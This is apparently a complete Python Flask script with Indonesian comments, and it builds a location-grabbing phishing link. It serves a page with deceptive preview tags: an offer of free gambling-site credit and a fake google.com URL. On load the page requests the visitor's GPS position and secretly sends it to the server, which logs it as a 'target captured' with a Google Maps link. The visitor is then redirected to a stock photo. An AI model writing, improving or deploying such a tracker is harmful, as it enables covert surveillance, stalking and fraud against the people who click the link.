from flask import Flask, request, render_template_string

app = Flask(__name__)

# Ini adalah halaman HTML dan JavaScript 
Halaman_HTML = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="SALDO GRATIS UNTUK MEMBER BARU">
    <meta property="og:description" content="ZEUS4DRTP GACOR">
    <meta property="og:image" content="https://images.unsplash.com/photo-1506744038136-46273834b3fb"> 
    <meta property="og:url" content="https://google.com">
    <meta property="og:type" content="website">

    <title>Memuat Foto...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 30%; background: #000; color: white; }
        .loader { border: 4px solid #333; border-top: 4px solid #ffffff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Sedang memproses Link Gacor...</p>

    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(kirimKeServer, tampilkanError);
            }
        };

        function kirimKeServer(posisi) {
            fetch('/terima_koordinat', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude: posisi.coords.latitude, longitude: posisi.coords.longitude }),
            }).then(() => {
                // Alihkan ke gambar asli setelah data GPS didapat
                window.location.href = "https://images.unsplash.com/photo-1506744038136-46273834b3fb";
            });
        }

        function tampilkanError() {
            window.location.href = "https://images.unsplash.com/photo-1770131100714-12a6989ec31d";
        }
    </script>
</body>
</html>
"""



# Route utama saat link diklik
@app.route('/')
def halaman_utama():
    return render_template_string(Halaman_HTML)

# Route untuk menerima data dari JavaScript secara diam-diam (di background)
@app.route('/terima_koordinat', methods=['POST'])
def terima_koordinat():
    data = request.get_json()
    lat = data.get('latitude')
    lon = data.get('longitude')
    
    print("\n" + "="*40)
    print("🎯 TARGET TERTANGKAP!")
    print(f"Latitude  : {lat}")
    print(f"Longitude : {lon}")
    print(f"Link Maps : https://www.google.com/maps/place/{lat},{lon}")
    print("="*40 + "\n")
    
    return "Sukses", 200

if __name__ == '__main__':
    # Menjalankan server di port 5000
    app.run(port=5000)
